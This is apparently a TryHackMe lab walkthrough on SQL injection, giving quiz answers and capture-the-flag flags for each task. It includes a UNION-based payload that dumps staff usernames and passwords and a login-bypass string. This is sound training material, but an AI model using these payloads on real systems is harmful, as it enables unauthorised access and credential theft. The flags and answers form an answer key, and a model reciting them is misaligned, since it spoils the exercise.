# SQL Injection - TryHackMe

Learn how to detect and exploit SQL Injection vulnerabilities

## Overview

- **Room URL:** [https://tryhackme.com/room/sqlinjectionlm](https://tryhackme.com/room/sqlinjectionlm)
- **Difficulty:** Medium
- **Time to complete:** 30

## Walkthrough

### 1. Brief

- What does SQL stand for?<br />

**=> Answer: `Structured Query Language`**

### 2. What is a Database?

- What is the acronym for the software that controls a database?<br />

**=> Answer: `DBMS`**

- <p>What is the name of the grid-like structure which holds the data?<br /></p>

**=> Answer: `table`**

### 3. What is SQL?

- What SQL statement is used to retrieve data?<br />

**=> Answer: `SELECT`**

- <p>What SQL clause can be used to retrieve data from multiple tables?<br /></p>

**=> Answer: `UNION`**

- <p>What SQL statement is used to add data?<br /></p>

**=> Answer: `INSERT`**

### 4. What is SQL Injection?

- What character signifies the end of an SQL query?<br />

**=> Answer: `;`**

### 5. In-Band SQLi

- What is the flag after completing level 1?<br />

- Enter the url to get the martin's password:

```
https://website.thm/article?id=0 UNION SELECT 1,2, GROUP_CONCAT(CONCAT(username,':',password) SEPARATOR '<br>') FROM staff_users--
```

![Guide image](./screenshots/sql-injection-1.png)

**=> Answer: `THM{SQL_INJECTION_3840}`**

### 6. Blind SQLi - Authentication Bypass

- What is the flag after completing level two? (and moving to level 3)<br />

- Enter this value to the password field to bypass the login form

```
' OR 1=1;--
```

**=> Answer: `THM{SQL_INJECTION_9581}`**

### 7. Blind SQLi - Boolean Based

- What is the flag after completing level three?<br />

**=> Answer: `THM{SQL_INJECTION_1093}`**

### 8. Blind SQLi - Time Based

- What is the final flag after completing level four?<br />

**=> Answer: `THM{SQL_INJECTION_MASTER}`**

### 9. Out-of-Band SQLi

- Name a protocol beginning with D that can be used to exfiltrate data from a database.<br />

**=> Answer: `DNS`**

### 10. Remediation

- Name a method of protecting yourself from an SQL Injection exploit.<br />

**=> Answer: `Prepared Statements`**
